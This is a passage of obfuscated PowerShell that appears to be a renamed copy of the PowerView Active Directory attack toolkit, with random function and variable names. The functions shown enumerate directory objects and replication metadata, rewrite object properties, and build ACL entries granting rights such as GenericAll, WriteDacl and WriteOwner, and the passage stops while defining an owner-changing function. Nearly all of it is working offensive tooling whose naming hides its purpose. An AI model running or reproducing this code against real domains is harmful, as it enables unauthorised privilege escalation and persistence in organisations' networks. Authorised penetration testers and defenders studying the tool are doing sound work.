                    $DlcqcBMAvlNxwiV = $_.Substring(4)
                    $CEKifFqxfnVApbV = [Int]($9HeFXhwjBUWerxx::$DlcqcBMAvlNxwiV)
                    $9QyouHvxMZKCIKN += "(!(userAccountControl:1.2.840.113556.1.4.803:=$CEKifFqxfnVApbV))"
                }
                else {
                    $CEKifFqxfnVApbV = [Int]($9HeFXhwjBUWerxx::$_)
                    $9QyouHvxMZKCIKN += "(userAccountControl:1.2.840.113556.1.4.803:=$CEKifFqxfnVApbV)"
                }
            }

            if ($9QyouHvxMZKCIKN -and $9QyouHvxMZKCIKN -ne '') {
                $AUHhiqKGQerdpLF.filter = "(&$9QyouHvxMZKCIKN)"
            }
            Write-Verbose "[ensnared] ensnared filter string: $($AUHhiqKGQerdpLF.filter)"

            if ($PSBoundParameters['FindOne']) { $xSLNEIXByfNTAdG = $AUHhiqKGQerdpLF.FindOne() }
            else { $xSLNEIXByfNTAdG = $AUHhiqKGQerdpLF.FindAll() }
            $xSLNEIXByfNTAdG | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {

                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = hoaxer -wDpWXLYTGZrAWN9 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($xSLNEIXByfNTAdG) {
                try { $xSLNEIXByfNTAdG.dispose() }
                catch {
                    Write-Verbose "[ensnared] Error disposing of the Results object: $_"
                }
            }
            $AUHhiqKGQerdpLF.dispose()
        }
    }
}


function foggy {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['FindOne']) { $tHAcROQOWB9HdRG['FindOne'] = $Fdx99xLobbqBPcQ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['Properties']) {
            $vXiEYYGKPH9YkVW = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $vXiEYYGKPH9YkVW = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $tHAcROQOWB9HdRG['Identity'] = $MhNmgElNMTxhWpJ }

        ensnared @SearcherArguments | ForEach-Object {
            $Lt9fBFA9A9LHslT = $_.Properties['distinguishedname'][0]
            ForEach($icEQTRxInMbojFy in $_.Properties['msds-replattributemetadata']) {
                $sLFDcxShvHxipvz = [xml]$icEQTRxInMbojFy | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($sLFDcxShvHxipvz) {
                    if ($sLFDcxShvHxipvz.pszAttributeName -Match $vXiEYYGKPH9YkVW) {
                        $MCqE9JDSKKFQghW = New-Object PSObject
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'ObjectDN' $Lt9fBFA9A9LHslT
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'AttributeName' $sLFDcxShvHxipvz.pszAttributeName
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'LastOriginatingChange' $sLFDcxShvHxipvz.ftimeLastOriginatingChange
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'Version' $sLFDcxShvHxipvz.dwVersion
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'LastOriginatingDsaDN' $sLFDcxShvHxipvz.pszLastOriginatingDsaDN
                        $MCqE9JDSKKFQghW.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $MCqE9JDSKKFQghW
                    }
                }
                else {
                    Write-Verbose "[foggy] Error retrieving 'msds-replattributemetadata' for '$Lt9fBFA9A9LHslT'"
                }
            }
        }
    }
}


function upstanding {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $wDpWXLYTGZrAWN9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }

        if ($PSBoundParameters['Properties']) {
            $vXiEYYGKPH9YkVW = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $vXiEYYGKPH9YkVW = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $tHAcROQOWB9HdRG['Identity'] = $MhNmgElNMTxhWpJ }

        ensnared @SearcherArguments | ForEach-Object {
            $Lt9fBFA9A9LHslT = $_.Properties['distinguishedname'][0]
            ForEach($icEQTRxInMbojFy in $_.Properties['msds-replvaluemetadata']) {
                $sLFDcxShvHxipvz = [xml]$icEQTRxInMbojFy | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($sLFDcxShvHxipvz) {
                    if ($sLFDcxShvHxipvz.pszAttributeName -Match $vXiEYYGKPH9YkVW) {
                        $MCqE9JDSKKFQghW = New-Object PSObject
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'ObjectDN' $Lt9fBFA9A9LHslT
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'AttributeName' $sLFDcxShvHxipvz.pszAttributeName
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'AttributeValue' $sLFDcxShvHxipvz.pszObjectDn
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'TimeCreated' $sLFDcxShvHxipvz.ftimeCreated
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'TimeDeleted' $sLFDcxShvHxipvz.ftimeDeleted
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'LastOriginatingChange' $sLFDcxShvHxipvz.ftimeLastOriginatingChange
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'Version' $sLFDcxShvHxipvz.dwVersion
                        $MCqE9JDSKKFQghW | Add-Member NoteProperty 'LastOriginatingDsaDN' $sLFDcxShvHxipvz.pszLastOriginatingDsaDN
                        $MCqE9JDSKKFQghW.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $MCqE9JDSKKFQghW
                    }
                }
                else {
                    Write-Verbose "[upstanding] Error retrieving 'msds-replvaluemetadata' for '$Lt9fBFA9A9LHslT'"
                }
            }
        }
    }
}


function similarity {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $MhNmgElNMTxhWpJ,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $tHAcROQOWB9HdRG = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $tHAcROQOWB9HdRG['Domain'] = $pkMxgDCVHqOym9m }
        if ($PSBoundParameters['LDAPFilter']) { $tHAcROQOWB9HdRG['LDAPFilter'] = $RmrzVOkRggEzAyC }
        if ($PSBoundParameters['SearchBase']) { $tHAcROQOWB9HdRG['SearchBase'] = $KZiNDyuCPTYnSy9 }
        if ($PSBoundParameters['Server']) { $tHAcROQOWB9HdRG['Server'] = $vzBgfX9wPWmbsYZ }
        if ($PSBoundParameters['SearchScope']) { $tHAcROQOWB9HdRG['SearchScope'] = $HWlMnJozs9zEkRJ }
        if ($PSBoundParameters['ResultPageSize']) { $tHAcROQOWB9HdRG['ResultPageSize'] = $hHyMPLAr9azKKcQ }
        if ($PSBoundParameters['ServerTimeLimit']) { $tHAcROQOWB9HdRG['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
        if ($PSBoundParameters['Tombstone']) { $tHAcROQOWB9HdRG['Tombstone'] = $gPSKVqwcbkEyaoZ }
        if ($PSBoundParameters['Credential']) { $tHAcROQOWB9HdRG['Credential'] = $szvFVWkPJummdcf }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $tHAcROQOWB9HdRG['Identity'] = $MhNmgElNMTxhWpJ }


        $RXXAxS9GGVaCDwq = ensnared @SearcherArguments

        ForEach ($Object in $RXXAxS9GGVaCDwq) {

            $Entry = $RXXAxS9GGVaCDwq.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[similarity] Setting '$($_.Name)' to '$($_.Value)' for object '$($RXXAxS9GGVaCDwq.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[similarity] Error setting/replacing properties for object '$($RXXAxS9GGVaCDwq.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $kNjdPpNmldsWGXn = $_.Name
                        $99WKLQj9zzZBuQY = $_.Value
                        Write-Verbose "[similarity] XORing '$kNjdPpNmldsWGXn' with '$99WKLQj9zzZBuQY' for object '$($RXXAxS9GGVaCDwq.Properties.samaccountname)'"
                        $AAoFQG9QeawrJsd = $Entry.$kNjdPpNmldsWGXn[0].GetType().name


                        $TiBgh9uJ99EdjUC = $($Entry.$kNjdPpNmldsWGXn) -bxor $99WKLQj9zzZBuQY
                        $Entry.$kNjdPpNmldsWGXn = $TiBgh9uJ99EdjUC -as $AAoFQG9QeawrJsd
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[similarity] Error XOR'ing properties for object '$($RXXAxS9GGVaCDwq.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $kNjdPpNmldsWGXn = $_
                        Write-Verbose "[similarity] Clearing '$kNjdPpNmldsWGXn' for object '$($RXXAxS9GGVaCDwq.Properties.samaccountname)'"
                        $Entry.$kNjdPpNmldsWGXn.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[similarity] Error clearing properties for object '$($RXXAxS9GGVaCDwq.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function derelict {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $ijdAmiOUcYBYghX
    )

    Begin {
        if($ijdAmiOUcYBYghX.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function vindicate {
            Param (
                [int[]]
                $NcNolvfVCQiLSSs
            )

            $FRuGyhAsuQXbD9z = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $NcNolvfVCQiLSSs[$i]
                $IQJFgwWwdtqcTml = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $FRuGyhAsuQXbD9z[$IQJFgwWwdtqcTml+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $FRuGyhAsuQXbD9z
        }
    }

    Process {
        $MCqE9JDSKKFQghW = @{
            Sunday = vindicate -NcNolvfVCQiLSSs $ijdAmiOUcYBYghX[0..2]
            Monday = vindicate -NcNolvfVCQiLSSs $ijdAmiOUcYBYghX[3..5]
            Tuesday = vindicate -NcNolvfVCQiLSSs $ijdAmiOUcYBYghX[6..8]
            Wednesday = vindicate -NcNolvfVCQiLSSs $ijdAmiOUcYBYghX[9..11]
            Thurs = vindicate -NcNolvfVCQiLSSs $ijdAmiOUcYBYghX[12..14]
            Friday = vindicate -NcNolvfVCQiLSSs $ijdAmiOUcYBYghX[15..17]
            Saturday = vindicate -NcNolvfVCQiLSSs $ijdAmiOUcYBYghX[18..20]
        }

        $MCqE9JDSKKFQghW = New-Object PSObject -Property $MCqE9JDSKKFQghW
        $MCqE9JDSKKFQghW.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $MCqE9JDSKKFQghW
    }
}


function Elizabethans {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $YxMST9VEDlAAqCt,

        [ValidateNotNullOrEmpty()]
        [String]
        $pZeHqwNBkdbvvev,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $kR9qtm9RoHGPltL,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $LLbOGDeWKOX9dUf,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $UqkUrMnUwqOjDVo,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $rcpYmma9oSyTPB9,

        [Guid]
        $opCVaAhRqxT9uha
    )

    Begin {
        if ($YxMST9VEDlAAqCt -notmatch '^S-1-.*') {
            $PgAtlKERfocLeNx = @{
                'Identity' = $YxMST9VEDlAAqCt
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $PgAtlKERfocLeNx['Domain'] = $pZeHqwNBkdbvvev }
            if ($PSBoundParameters['Server']) { $PgAtlKERfocLeNx['Server'] = $vzBgfX9wPWmbsYZ }
            if ($PSBoundParameters['SearchScope']) { $PgAtlKERfocLeNx['SearchScope'] = $HWlMnJozs9zEkRJ }
            if ($PSBoundParameters['ResultPageSize']) { $PgAtlKERfocLeNx['ResultPageSize'] = $hHyMPLAr9azKKcQ }
            if ($PSBoundParameters['ServerTimeLimit']) { $PgAtlKERfocLeNx['ServerTimeLimit'] = $kzlBjIuOb9n9uyj }
            if ($PSBoundParameters['Tombstone']) { $PgAtlKERfocLeNx['Tombstone'] = $gPSKVqwcbkEyaoZ }
            if ($PSBoundParameters['Credential']) { $PgAtlKERfocLeNx['Credential'] = $szvFVWkPJummdcf }
            $9bLdJMyvGwXmAHK = ensnared @PrincipalSearcherArguments
            if (-not $9bLdJMyvGwXmAHK) {
                throw "Unable to resolve principal: $YxMST9VEDlAAqCt"
            }
            elseif($9bLdJMyvGwXmAHK.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $BwJjYSLSjCOa9Mo = $9bLdJMyvGwXmAHK.objectsid
        }
        else {
            $BwJjYSLSjCOa9Mo = $YxMST9VEDlAAqCt
        }

        $uPAqrjlaeZ9l9vG = 0
        foreach($r in $Right) {
            $uPAqrjlaeZ9l9vG = $uPAqrjlaeZ9l9vG -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $uPAqrjlaeZ9l9vG = [System.DirectoryServices.ActiveDirectoryRights]$uPAqrjlaeZ9l9vG

        $MhNmgElNMTxhWpJ = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$BwJjYSLSjCOa9Mo)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {

            if($UqkUrMnUwqOjDVo -eq $null -and $rcpYmma9oSyTPB9 -eq [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $LLbOGDeWKOX9dUf
            } elseif($UqkUrMnUwqOjDVo -eq $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $LLbOGDeWKOX9dUf, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$rcpYmma9oSyTPB9)
            } elseif($UqkUrMnUwqOjDVo -eq $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $LLbOGDeWKOX9dUf, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$rcpYmma9oSyTPB9), $opCVaAhRqxT9uha
            } elseif($UqkUrMnUwqOjDVo -ne $null -and $rcpYmma9oSyTPB9 -eq [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $LLbOGDeWKOX9dUf, $UqkUrMnUwqOjDVo
            } elseif($UqkUrMnUwqOjDVo -ne $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $LLbOGDeWKOX9dUf, $UqkUrMnUwqOjDVo, $rcpYmma9oSyTPB9
            } elseif($UqkUrMnUwqOjDVo -ne $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $LLbOGDeWKOX9dUf, $UqkUrMnUwqOjDVo, $rcpYmma9oSyTPB9, $opCVaAhRqxT9uha
            }

        }
        else {

            if($UqkUrMnUwqOjDVo -eq $null -and $rcpYmma9oSyTPB9 -eq [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $kR9qtm9RoHGPltL
            } elseif($UqkUrMnUwqOjDVo -eq $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $kR9qtm9RoHGPltL, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$rcpYmma9oSyTPB9)
            } elseif($UqkUrMnUwqOjDVo -eq $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $kR9qtm9RoHGPltL, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$rcpYmma9oSyTPB9), $opCVaAhRqxT9uha
            } elseif($UqkUrMnUwqOjDVo -ne $null -and $rcpYmma9oSyTPB9 -eq [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $kR9qtm9RoHGPltL, $UqkUrMnUwqOjDVo
            } elseif($UqkUrMnUwqOjDVo -ne $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $kR9qtm9RoHGPltL, $UqkUrMnUwqOjDVo, $rcpYmma9oSyTPB9
            } elseif($UqkUrMnUwqOjDVo -ne $null -and $rcpYmma9oSyTPB9 -ne [String]::Empty -and $opCVaAhRqxT9uha -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $MhNmgElNMTxhWpJ, $uPAqrjlaeZ9l9vG, $kR9qtm9RoHGPltL, $UqkUrMnUwqOjDVo, $rcpYmma9oSyTPB9, $opCVaAhRqxT9uha
            }

        }
    }
}


function storms {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $MhNmgElNMTxhWpJ,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $ZoxCdvQJJjqDiLQ,

        [ValidateNotNullOrEmpty()]
        [String]
        $pkMxgDCVHqOym9m,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RmrzVOkRggEzAyC,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $KZiNDyuCPTYnSy9,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vzBgfX9wPWmbsYZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $HWlMnJozs9zEkRJ = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $hHyMPLAr9azKKcQ = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $kzlBjIuOb9n9uyj,

        [Switch]
        $gPSKVqwcbkEyaoZ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $szvFVWkPJummdcf = [Management.Automation.PSCredential]::Empty
    )

